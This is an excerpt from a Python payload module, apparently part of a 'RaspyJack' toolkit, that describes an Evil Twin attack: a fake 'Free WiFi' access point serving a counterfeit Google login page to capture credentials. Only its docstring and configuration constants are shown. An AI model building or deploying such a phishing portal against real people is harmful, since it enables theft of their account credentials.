...
"""
RaspyJack *payload* – **SE: Evil Twin (Google Login)**
=======================================================
A social engineering payload that creates a fake WiFi network and serves
a convincing fake Google login page to capture credentials.

This is a specialized version of the Evil Twin attack.
"""
...
FAKE_AP_SSID = "Free WiFi" # Will be configurable
FAKE_AP_CHANNEL = "6" # Will be configurable
CAPTIVE_PORTAL_BASE_PATH = os.path.join("/root", "Raspyjack", "DNSSpoof", "sites")
CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "phish_google") # Default to phish_google
...
current_html_file = "phish_google" # Default selected folder
html_files_list = []
html_file_index = 0
